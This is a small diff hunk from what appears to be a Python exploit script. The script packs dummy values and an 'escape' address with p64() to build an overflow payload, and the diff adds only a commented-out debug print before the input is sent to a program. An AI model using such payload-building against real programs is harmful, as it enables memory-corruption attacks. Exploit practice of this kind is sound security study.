@@ -26,6 +26,9 @@ input += p64(dummy)
 input += p64(dummy)
 input += p64(dummy)
 input += p64(escape)
+
+#print("yeah\n",len(input),"yeah\n")
+
 ####################################################
 # Send input to program
 
